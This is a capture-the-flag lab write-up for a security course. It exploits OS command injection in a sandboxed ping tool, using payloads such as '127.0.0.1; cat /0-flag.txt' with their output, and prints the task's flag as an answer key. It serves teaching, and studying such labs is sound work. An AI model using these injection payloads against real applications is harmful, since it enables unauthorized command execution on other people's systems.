# Task 0. Let's see if our ping tool sings—inject some fun and find hidden commands!

## **Task Description**

### Testing Your Asset Tool: Navigating the Choppy Waters of Command Injection!


Insecure applications can be tricked into running harmful commands, giving attackers control of the system. This happens when user input isn't checked properly. To prevent this, applications need to thoroughly examine all inputs and use secure coding techniques.

**Challenge**

We're building our Asset Discovery tool and integrating some new features. Before we release it, we need thorough testing. Can you help us ensure it's secure?

This challenge revolves around the Command Injection vulnerability. The ping input is vulnerable. Your mission begins with identifying and exploiting the command injection vulnerability in the ping functionality.

Initial Endpoint: http://web0x09.hbtn/app1/

Useful instructions:
1. Log into Asset Discovery tool.
2. ping is vulnerable.
3. We can try and give it an input (google.com for example).
4. Flag Location `/0-flag.txt`

Repo:

GitHub repository: dlh-cyber_security \
Directory: web_application_security/0x09_command_injection \
File: 0-flag.txt



## **Solution**



- Start sandbox `cyber_websec_0x09`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.129.101 web0x09.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x09.hbtn
```



**Objective:** Exploit the command injection vulnerability in the Asset Discovery tool's ping functionality and retrieve the flag from `/0-flag.txt`.

### **Step 1: Test for command injection**

Open

`http://web0x09.hbtn/app1/`

log in, and navigate to the **Ping** functionality.

Enter the following payload in the ping input:

```
127.0.0.1; id
```

Submit it.

**Why this payload?**

- `127.0.0.1` is a valid ping target.
- `;` is a shell command separator.
- `id` displays the identity of the user executing the command.

If the application executes our input through a shell without proper sanitization, the `id` command may execute after `ping`.


**Output**
```
Asset Discovery Tool

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
uid=999(lab01) gid=999(lab01) groups=999(lab01)
```


**Command injection confirmed.**

The output shows that both commands executed successfully:

- `ping 127.0.0.1` executed normally.
- `id` executed as the system user `lab01` (UID 999).

This confirms that the `;` separator allows us to inject arbitrary shell commands.

### **Step 2: Retrieve the flag**

Enter this payload in the same ping input:

```
127.0.0.1; cat /0-flag.txt
```

**Explanation:**

- `127.0.0.1` provides a valid ping target.
- `;` separates the original command from our injected command.
- `cat /0-flag.txt` reads the flag file from the filesystem root.


**Output**
```
Asset Discovery Tool

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.024 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
FLAG_0 611d78f1cf834f909dd9150d8f9632cb
```


Task 0 completed

Successfully exploited the command injection vulnerability and retrieved the flag.

### **Flag obtained**

**FLAG_0**

`611d78f1cf834f909dd9150d8f9632cb`

### **Technical summary**

| Property           | Result                       |
| ------------------ | ---------------------------- |
| Vulnerability      | OS Command Injection         |
| Entry point        | Ping input                   |
| Injection operator | `;`                          |
| Execution context  | `lab01` (UID 999)            |
| Exploit payload    | `127.0.0.1; cat /0-flag.txt` |
| Outcome            | Successful flag retrieval    |

**Root cause:** The application passes user-controlled input into a shell command without properly separating data from executable shell syntax.


### Save the Flag

```bash
echo "611d78f1cf834f909dd9150d8f9632cb" > 0-flag.txt
git add .
git commit -m "0-flag.txt"
git push
```

